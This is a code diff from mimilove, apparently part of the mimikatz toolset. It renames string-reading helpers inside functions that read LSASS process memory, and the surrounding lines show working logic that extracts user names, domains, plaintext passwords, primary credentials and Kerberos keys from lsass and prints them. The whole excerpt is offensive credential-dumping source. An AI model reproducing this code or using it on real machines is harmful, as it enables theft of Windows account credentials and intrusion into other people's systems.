@@ -150,9 +150,9 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 											{
 												if(aLsassMemory.address = entry.Credentials)
 												{
-													kull_m_string_getUnicodeString(&entry.UserName, hMemory);
-													kull_m_string_getUnicodeString(&entry.Domaine, hMemory);
-													kull_m_string_getSid(&entry.pSid, hMemory);
+													kull_m_process_getUnicodeString(&entry.UserName, hMemory);
+													kull_m_process_getUnicodeString(&entry.Domaine, hMemory);
+													kull_m_process_getSid(&entry.pSid, hMemory);
 
 													kprintf(L"Authentication Id : %u ; %u (%08x:%08x)\n"
 														L"Session           : %s from %u\n"
@@ -185,8 +185,8 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 																	aLocalMemory.address = &primaryCredentials;
 																	if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)))
 																	{
-																		kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, hMemory);
-																		kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Credentials, hMemory);
+																		kull_m_process_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, hMemory);
+																		kull_m_process_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Credentials, hMemory);
 
 																		kprintf(L"\t[%Z]\n", &primaryCredentials.Primary);
 																		if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
@@ -300,9 +300,9 @@ void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
 						{
 							if(session.Password.Length || session.pKeyList)
 							{
-								kull_m_string_getUnicodeString(&session.UserName, hMemory);
-								kull_m_string_getUnicodeString(&session.Domaine, hMemory);
-								kull_m_string_getUnicodeString(&session.Password, hMemory);
+								kull_m_process_getUnicodeString(&session.UserName, hMemory);
+								kull_m_process_getUnicodeString(&session.Domaine, hMemory);
+								kull_m_process_getUnicodeString(&session.Password, hMemory);
 
 								kprintf(L"Authentication Id : %u ; %u (%08x:%08x)\n"
 									L"User Name         : %wZ\n"
@@ -338,7 +338,7 @@ void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
 													{
 														if(tmpBuffer.Buffer = (PWSTR) pKeys[i].generic.Checksump)
 														{
-															if(kull_m_string_getUnicodeString(&tmpBuffer, hMemory))
+															if(kull_m_process_getUnicodeString(&tmpBuffer, hMemory))
 															{
 																kull_m_string_wprintf_hex(tmpBuffer.Buffer, tmpBuffer.Length, 0); kprintf(L"\n");
 																LocalFree(tmpBuffer.Buffer);
